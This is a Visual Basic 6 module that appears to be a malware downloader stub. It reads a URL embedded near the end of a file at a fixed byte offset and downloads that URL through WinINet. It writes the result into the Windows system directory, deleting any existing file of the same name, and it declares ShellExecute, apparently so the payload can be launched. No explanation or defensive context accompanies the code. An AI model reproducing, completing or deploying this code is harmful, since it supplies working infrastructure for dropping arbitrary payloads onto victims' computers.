Attribute VB_Name = "Module1"
Option Explicit


Public Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Public Declare Function InternetCloseHandle Lib "wininet" (ByVal hInet As Long) As Integer
Public Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Public Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Const INTERNET_OPEN_TYPE_DIRECT = 1
Public Const INTERNET_FLAG_RELOAD = &H80000000

Dim fso As New FileSystemObject

Dim ras As String * 3
Public url As String * 200

Public Sub Downloaders(web As String)
Dim res As Long
Dim rop As Long
Dim rrf As Long
Dim data As Long
Dim dato As String
Dim buffer As String * 1000
res = InternetOpen("Downloaders", INTERNET_OPEN_TYPE_DIRECT, vbNullString, vbNullString, 0&)
If res = 0 Then Exit Sub
rop = InternetOpenUrl(res, web, vbNullString, ByVal 0&, INTERNET_FLAG_RELOAD, ByVal 0&)
If rop = 0 Then Exit Sub

If fso.FileExists(Destino) = True Then fso.DeleteFile Destino

Open Destino For Binary As #1
Do
rrf = InternetReadFile(rop, buffer, 1000, data)
If rrf > 0 Then dato = Left(buffer, data): Put #1, , dato
Loop Until data <> 1000
Close #1
InternetCloseHandle rrf
InternetCloseHandle res
End Sub

Public Function GetWindows() As String
Dim res As Long
Dim s As String
s = Space(255)
res = GetWindowsDirectory(s, Len(s))
If res <> 0 Then GetWindows = Left(s, res)
End Function
Public Sub load(path As String)
Open path For Binary As #1
Get #1, LOF(1) - 203, ras
Get #1, , url
Close #1
End Sub
Public Function Destino() As String
Dim s As Integer
Dim lef As String
s = InStrRev(Trim(url), "/")
lef = Left(Trim(url), s)
Destino = GetWindows & "\" & Mid(Trim(url), Len(lef) + 1, Len(Trim(url)))
End Function

